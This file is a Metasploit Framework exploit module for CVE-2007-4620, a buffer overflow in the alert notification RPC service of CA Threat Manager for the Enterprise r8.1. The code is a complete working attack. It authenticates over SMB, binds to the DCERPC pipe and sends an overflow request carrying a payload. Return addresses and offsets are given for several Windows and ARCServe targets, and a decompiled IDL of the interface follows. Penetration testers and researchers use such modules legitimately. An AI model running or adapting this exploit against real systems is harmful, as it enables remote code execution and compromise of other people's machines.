##
# $Id: etrust_itm_alert.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Computer Associates Alert Notification Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Computer Associates Threat Manager for the Enterprise r8.1
				By sending a specially crafted RPC request, an attacker could overflow the buffer and execute arbitrary code.
				In order to successfully exploit this vulnerability, you will need valid logon credentials to the target.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2007-4620' ],
					[ 'OSVDB', '44040' ],
					[ 'BID', '28605' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Windows 2003 SP0 English',	{ 'Offset' => 979, 'Ret' => 0x77e03efb } ],
					[ 'Windows 2000 SP4 English',	{ 'Offset' => 979, 'Ret' => 0x7c30d043 } ],
					[ 'CA BrightStor ARCServe Backup 11.5 / Windows 2000 SP4 English', { 'Offset' => 207, 'Ret' => 0x7c2e7993 } ], # Yin Dehui
				],
			'DisclosureDate' => 'Apr 4 2008',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (alert)", 'alert']),
			], self.class)
	end

	def exploit
		connect()
		smb_login()

		handle = dcerpc_handle('3d742890-397c-11cf-9bf1-00805f88cb72', '1.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		filler =  rand_text_english(target['Offset']) + [target.ret].pack('V') + make_nops(12)
		filler << payload.encoded + rand_text_english(772)

		sploit =  NDR.string(rand_text_english(rand(1024) + 1) + "\x00") + NDR.string(filler + "\x00")
		sploit << NDR.string(rand_text_english(rand(1024) + 1) + "\x00") + NDR.long(0)

		print_status("Trying target #{target.name}...")

			begin
				dcerpc_call(0x00, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end

end

=begin
/*
 * IDL code generated by mIDA v1.0.8
 * Copyright (C) 2006, Tenable Network Security
 * http://cgi.tenablesecurity.com/tenable/mida.php
 *
 *
 * Decompilation information:
 * RPC stub type: inline
 */

[ uuid(3d742890-397c-11cf-9bf1-00805f88cb72), version(1.0) ]

interface mIDA_interface
{
typedef struct struct_1 {
	long elem_1;
	[size_is(10000), length_is(elem_1)] struct struct_2 * elem_2;
} struct_1 ;

typedef struct struct_2 {
	char elem_1[52];
} struct_2 ;


/* opcode: 0x00, address: 0x00401000 */

long   sub_401000 (
	[in][ref][string] char * arg_1,
	[out][ref] struct struct_1 * arg_2,
	[in][ref][string] char * arg_3
);

}
=end